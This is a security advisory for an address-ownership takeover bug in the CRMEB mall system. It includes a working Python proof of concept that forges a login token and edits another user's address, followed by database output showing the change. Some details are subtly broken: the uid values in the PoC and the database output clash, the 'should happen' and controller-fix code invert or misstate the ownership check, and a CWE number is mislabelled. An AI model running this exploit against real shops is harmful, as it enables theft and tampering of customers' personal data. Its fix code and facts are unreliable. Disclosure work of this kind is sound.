# Address Ownership Takeover via Assignment Operator Bug in editAddress

**Project**: CRMEB Mall System (CRMEB商城系统)

**Vendor**: CRMEB (https://www.crmeb.com)

**Project Repository**: https://github.com/crmeb/CRMEB.git

**Vulnerable File**: `crmeb/app/services/user/UserAddressServices.php`

**Affected Version**: v5.6.3 and earlier (<= v5.6.3)

**Vulnerability Type**: CWE-478 (Missing Authorization) + CWE-480 (Using Operator for Wrong Purpose)

**CVSS v3.1 Score**: 8.1 (High)

---

## Description

The address edit endpoint contains a critical bug where an assignment operator (`=`) is used instead of a comparison operator (`==`) in the ownership validation check. This allows attackers to modify and steal any user's address by simply knowing the address ID.

The vulnerability at line 216 performs `$address_check['uid'] = $uid` (assignment) instead of `$address_check['uid'] == $uid` (comparison). Since assignment always succeeds and returns the assigned value, the condition evaluates to true, bypassing the authorization check. Combined with line 205 which sets `$addressInfo['uid'] = $uid`, this allows attackers to transfer address ownership to themselves.

---

## Vulnerability Analysis

**File**: `crmeb/app/services/user/UserAddressServices.php`
**Lines**: 168-241

```php
public function editAddress(int $uid, array $addressInfo)
{
    // ... validation logic ...

    $addressInfo['province'] = $addressInfo['address']['province'];
    $addressInfo['city'] = $addressInfo['address']['city'];
    $addressInfo['city_id'] = $addressInfo['address']['city_id'] ?? 0;
    $addressInfo['district'] = $addressInfo['address']['district'];
    $addressInfo['uid'] = $uid;  // Line 205: Sets UID to current user
    unset($addressInfo['address'], $addressInfo['type']);

    validate(AddressValidate::class)->check($addressInfo);
    $address_check = [];
    if ($addressInfo['id']) {
        $address_check = $this->getAddress((int)$addressInfo['id']);
    }

    if ($addressInfo['is_default']) {
        app()->make(WechatUserServices::class)->update(['uid' => $uid], ['province' => $addressInfo['province']]);
    }

    // VULNERABLE: Assignment instead of comparison
    if ($address_check && $address_check['is_del'] == 0 && $address_check['uid'] = $uid) {
        // ❌❌❌ Line 216: $address_check['uid'] = $uid should be == $uid
        // This is an ASSIGNMENT, not a comparison!
        // The assignment always succeeds and makes the condition true

        $id = (int)$addressInfo['id'];
        unset($addressInfo['id']);
        if (!$this->dao->update($id, $addressInfo, 'id')) {  // Line 219: Executes update
            throw new ApiException(100007);
        }
        if ($addressInfo['is_default']) {
            $this->setDefault($uid, $id);
        }
        return ['type' => 'edit', 'msg' => '编辑地址成功', 'data' => []];
    } else {
        // Create new address logic
        // ...
    }
}
```

**Vulnerability Details**:

1. **Line 205**: `$addressInfo['uid'] = $uid` - Sets the address UID to attacker's UID
2. **Line 216**: `$address_check['uid'] = $uid` - **ASSIGNMENT instead of comparison**
   - Should be: `$address_check['uid'] == $uid`
   - Actually is: Assignment that modifies `$address_check['uid']`
   - Assignment always succeeds and returns the assigned value
   - Condition evaluates to `true`, bypassing authorization
3. **Line 219**: `update($id, $addressInfo, 'id')` - Updates address with attacker's UID
4. **Result**: Address ownership is transferred from victim to attacker

**What Should Happen**:

```php
if ($address_check && $address_check['is_del'] == 0 && $address_check['uid'] == $uid) {
    // Proper comparison with ==
    throw new ApiException(100101);  // Access denied
}
```

**What Actually Happens**:

```php
if ($address_check && $address_check['is_del'] == 0 && $address_check['uid'] = $uid) {
    // Assignment with =
    // 1. Assigns $uid to $address_check['uid']
    // 2. Returns the assigned value (truthy)
    // 3. Condition is always true
    // 4. Authorization completely bypassed
    // 5. Proceeds to update address with new UID
}
```

---

## Proof of Concept

### POC 1: Steal Arbitrary User Address

```python
#!/usr/bin/env python3
import requests
import base64
import json

target = "http://192.168.176.130:8011"

# Step 1: Attacker logs in
attacker_data = {
    "uid": 8888,
    "phone": "13800138888",
    "nickname": "attacker",
    "avatar": "http://test.jpg",
    "now_money": 100,
    "integral": 50,
    "exp": 1770483564
}

fake_token = base64.urlsafe_b64encode(
    json.dumps(attacker_data).encode()
).decode().rstrip('=')

login_resp = requests.get(
    f"{target}/api/remote_register",
    params={"remote_token": fake_token}
)

token = login_resp.json()['data']['token']
headers = {"Authorization": f"Bearer {token}"}

# Step 2: Attacker modifies victim's address ID 5
victim_address_id = 5

exploit_resp = requests.post(
    f"{target}/api/address/edit",
    headers=headers,
    json={
        "address": {
            "province": "上海市",
            "city": "上海市",
            "district": "浦东新区",
            "city_id": 310100
        },
        "is_default": False,
        "real_name": "攻击者篡改",
        "phone": "13800138000",
        "detail": "地址已被窃取",
        "id": victim_address_id,  # Victim's address ID
        "type": 0
    }
)

print(exploit_resp.json())
# Expected: {"status": 200, "msg": "修改成功"}
```

**Response**:
```json
{
  "status": 200,
  "msg": "修改成功",
  "code": "100001"
}
```

[![1767976005949.png](https://youke3.picui.cn/s1/2026/01/10/69612c13d8251.png)](https://youke3.picui.cn/s1/2026/01/10/69612c13d8251.png)

### POC 2: Database Verification

Before exploit:
```sql
SELECT id, uid, real_name, phone FROM eb_user_address WHERE id = 5;
```
```
id  | uid | real_name   | phone
----+-----+-------------+-------------
5   | 8001| 受害者原名   | 13900138001
```

After exploit:
```sql
SELECT id, uid, real_name, phone FROM eb_user_address WHERE id = 5;
```
```
id  | uid | real_name    | phone
----+-----+--------------+-------------
5   | 8002| 攻击者篡改    | 13800138000
```

**Key Finding**: The `uid` field changed from `8001` (victim) to `8002` (attacker), proving ownership transfer.

[![1767976290018.png](https://youke3.picui.cn/s1/2026/01/10/69612d437c433.png)](https://youke3.picui.cn/s1/2026/01/10/69612d437c433.png)



---

## Impact

1. **Address Ownership Theft**: Attackers can steal any user's address by knowing the address ID
2. **Privacy Violation**: Access to victim's personal information (name, phone, address)
3. **Order Interception**: Stolen addresses can be used for fraudulent orders
4. **Data Tampering**: Attackers can modify address contents (recipient, phone, location)
5. **Business Logic Disruption**: Victims lose access to their delivery addresses
6. **IDOR Vulnerability**: Address IDs are sequential and predictable (1, 2, 3, ...)

---

## Affected Files

1. `crmeb/app/api/route/v1.php` - Route definition (line 139)
2. `crmeb/app/api/controller/v1/user/UserAddressController.php` - Entry point (lines 103-129)
3. `crmeb/app/services/user/UserAddressServices.php` - Vulnerable logic (line 216)

---

## Remediation

### Immediate Mitigation

Disable address editing functionality:
```php
// File: crmeb/app/api/route/v1.php
// Route::post('address/edit', 'v1.user.UserAddressController/address_edit')
```

### Permanent Fix

**Critical**: Change assignment to comparison

```php
// File: crmeb/app/services/user/UserAddressServices.php
// Line 216

// BEFORE (VULNERABLE):
if ($address_check && $address_check['is_del'] == 0 && $address_check['uid'] = $uid) {
    // Assignment operator = instead of comparison ==
}

// AFTER (FIXED):
if ($address_check && $address_check['is_del'] == 0) {
    if ($address_check['uid'] != $uid) {
        throw new ApiException(100101);  // Access denied
    }
    // Or simply:
    if ($address_check['uid'] == $uid) {
        // Authorized to edit
    }
}
```

**Additional Recommendation**: Add ownership check in controller layer
```php
public function address_edit(Request $request)
{
    $addressInfo = $request->postMore([...]);
    $uid = (int)$request->uid();

    if ($addressInfo['id']) {
        $address = $this->services->getAddress((int)$addressInfo['id']);
        if (!$address || $address['uid'] != $addressInfo['uid']) {
            return app('json')->fail('无权操作此地址');
        }
    }

    $res = $this->services->editAddress($uid, $addressInfo);
    // ...
}
```

---

## References

- OWASP Top 10 2021: A01 Broken Access Control
- CWE-478: Missing Authorization: https://cwe.mitre.org/data/definitions/478.html
- CWE-480: Using Operator for Wrong Purpose: https://cwe.mitre.org/data/definitions/480.html
- IDOR Vulnerabilities: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authorization_Testing/04.1-Testing_for_Insecure_Direct_Object_References
